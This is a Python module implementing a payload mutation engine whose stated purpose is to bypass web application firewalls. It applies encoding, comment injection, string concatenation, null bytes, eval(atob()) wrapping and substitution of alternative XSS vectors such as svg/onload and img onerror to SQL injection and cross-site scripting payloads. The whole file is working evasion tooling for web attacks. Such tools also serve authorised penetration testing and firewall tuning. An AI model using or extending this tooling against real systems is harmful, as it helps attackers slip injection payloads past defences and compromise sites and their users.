"""
Payload Mutator Engine
Applies various encoding and obfuscation techniques to bypass WAF filters.
"""

import urllib.parse
import base64
import random
import html
import re
from typing import Dict, List, Optional


class PayloadMutator:
    """Applies mutations to payloads for WAF bypass."""

    AVAILABLE_MUTATIONS = [
        "url_encode",
        "double_url_encode",
        "html_entity_encode",
        "unicode_encode",
        "case_switch",
        "comment_inject",
        "whitespace_replace",
        "string_concat",
        "hex_encode",
        "base64_wrap",
        "null_byte_inject",
        "tag_attribute_shuffle",
    ]

    def mutate(
        self,
        payload: str,
        mutations: Optional[List[str]] = None,
    ) -> Dict[str, str]:
        """
        Apply specified mutations to a payload.

        Args:
            payload: Original payload string
            mutations: List of mutation names to apply.
                      If None, applies all available mutations.

        Returns:
            Dict mapping mutation name -> mutated payload
        """
        if mutations is None:
            mutations = self.AVAILABLE_MUTATIONS

        results = {"original": payload}

        for mutation in mutations:
            mutation_lower = mutation.lower().strip()
            method_name = f"_mutate_{mutation_lower}"
            method = getattr(self, method_name, None)
            if method:
                try:
                    results[mutation_lower] = method(payload)
                except Exception as e:
                    results[mutation_lower] = f"[ERROR: {e}]"
            else:
                results[mutation_lower] = f"[Unknown mutation: {mutation}]"

        return results

    def mutate_all(self, payload: str) -> Dict[str, str]:
        """Apply all available mutations to a payload."""
        return self.mutate(payload, self.AVAILABLE_MUTATIONS)

    # ── Mutation Methods ─────────────────────────────────────────

    def _mutate_url_encode(self, payload: str) -> str:
        """URL encode special characters."""
        return urllib.parse.quote(payload, safe="")

    def _mutate_double_url_encode(self, payload: str) -> str:
        """Double URL encode (encode the % signs from first encoding)."""
        first_pass = urllib.parse.quote(payload, safe="")
        return urllib.parse.quote(first_pass, safe="")

    def _mutate_html_entity_encode(self, payload: str) -> str:
        """Convert characters to HTML numeric entities."""
        return "".join(f"&#{ord(c)};" for c in payload)

    def _mutate_unicode_encode(self, payload: str) -> str:
        """Convert to Unicode escape sequences (\\\\uXXXX) for JS contexts."""
        result = []
        for c in payload:
            if c.isalpha():
                result.append(f"\\u{ord(c):04x}")
            else:
                result.append(c)
        return "".join(result)

    def _mutate_case_switch(self, payload: str) -> str:
        """Randomly switch case of alphabetic characters."""
        result = []
        for c in payload:
            if c.isalpha():
                result.append(c.upper() if random.random() > 0.5 else c.lower())
            else:
                result.append(c)
        return "".join(result)

    def _mutate_comment_inject(self, payload: str) -> str:
        """
        Inject comments to break up keywords.
        Works for both SQL (/**/) and HTML (<!---->) contexts.
        """
        # For SQL keywords
        sql_keywords = [
            "SELECT", "UNION", "INSERT", "UPDATE", "DELETE",
            "FROM", "WHERE", "ORDER", "GROUP", "HAVING",
            "SLEEP", "BENCHMARK", "CONCAT", "INFORMATION_SCHEMA",
        ]
        result = payload
        for kw in sql_keywords:
            # Case insensitive replacement with comment injection
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            if pattern.search(result):
                mid = len(kw) // 2
                replacement = kw[:mid] + "/**/" + kw[mid:]
                result = pattern.sub(replacement, result, count=1)

        # For HTML tags — inject between < and tag name
        result = re.sub(
            r"<(/?)(script|svg|img|iframe|body|input|object|embed|video|audio)",
            lambda m: f"<{m.group(1)}{''.join(random.choice([c.upper(), c.lower()]) for c in m.group(2))}",
            result,
            flags=re.IGNORECASE,
        )

        return result

    def _mutate_whitespace_replace(self, payload: str) -> str:
        """Replace spaces with alternative whitespace characters."""
        alternatives = ["%09", "%0a", "%0d", "%0c", "+", "/**/"]
        alt = random.choice(alternatives)
        return payload.replace(" ", alt)

    def _mutate_string_concat(self, payload: str) -> str:
        """
        Break up string literals using concatenation.
        Targets common keywords: alert, script, select, union, etc.
        """
        keywords = [
            "alert", "script", "select", "union", "eval",
            "prompt", "confirm", "concat", "document", "window",
            "cookie", "passwd", "admin", "sleep",
        ]
        result = payload
        for kw in keywords:
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            match = pattern.search(result)
            if match:
                original = match.group()
                mid = len(original) // 2
                # Use different concat styles
                concat_styles = [
                    f"'{original[:mid]}'+'{ original[mid:]}'",
                    f"'{original[:mid]}'||'{original[mid:]}'",
                ]
                result = result[:match.start()] + random.choice(concat_styles) + result[match.end():]

        return result

    def _mutate_hex_encode(self, payload: str) -> str:
        """Convert characters to hex encoding."""
        result = []
        for c in payload:
            if c.isalpha():
                result.append(f"\\x{ord(c):02x}")
            else:
                result.append(c)
        return "".join(result)

    def _mutate_base64_wrap(self, payload: str) -> str:
        """Wrap payload in base64 encoding with eval/atob decoder."""
        encoded = base64.b64encode(payload.encode()).decode()
        return f"eval(atob('{encoded}'))"

    def _mutate_null_byte_inject(self, payload: str) -> str:
        """Inject null bytes at strategic positions."""
        # Insert null byte before key characters
        result = payload.replace("<", "%00<")
        result = result.replace("'", "%00'")
        result = result.replace('"', '%00"')
        return result

    def _mutate_tag_attribute_shuffle(self, payload: str) -> str:
        """
        Replace common event handlers and tags with alternatives.
        Uses less common but equivalent HTML elements and events.
        """
        replacements = {
            "onerror": random.choice(["onload", "onfocus", "onmouseover", "onauxclick"]),
            "<script": random.choice(["<svg/onload", "<img src=x onerror", "<body onload", "<details open ontoggle"]),
            "alert(": random.choice(["prompt(", "confirm(", "print(", "top.alert("]),
            "<img ": random.choice(["<video ", "<audio ", "<source ", "<input autofocus "]),
        }

        result = payload
        for old, new in replacements.items():
            if old in result.lower():
                # Case insensitive replacement (keep first occurrence only)
                pattern = re.compile(re.escape(old), re.IGNORECASE)
                result = pattern.sub(new, result, count=1)

        return result

    @classmethod
    def list_mutations(cls) -> List[Dict[str, str]]:
        """List all available mutation techniques with descriptions."""
        descriptions = {
            "url_encode": "URL encode all special characters (%XX format)",
            "double_url_encode": "Double URL encode (encode the percent signs too)",
            "html_entity_encode": "Convert to HTML numeric entities (&#NNN;)",
            "unicode_encode": "Convert letters to Unicode escape (\\uXXXX) for JS contexts",
            "case_switch": "Randomly switch upper/lower case of letters",
            "comment_inject": "Inject SQL/HTML comments to break keywords (SEL/**/ECT)",
            "whitespace_replace": "Replace spaces with tabs, newlines, or comments",
            "string_concat": "Break keywords into concatenated strings ('al'+'ert')",
            "hex_encode": "Convert letters to hex encoding (\\xXX)",
            "base64_wrap": "Wrap payload in base64 with eval(atob()) decoder",
            "null_byte_inject": "Insert null bytes (%00) at strategic positions",
            "tag_attribute_shuffle": "Replace common tags/events with less common alternatives",
        }
        return [
            {"name": name, "description": descriptions.get(name, "")}
            for name in cls.AVAILABLE_MUTATIONS
        ]
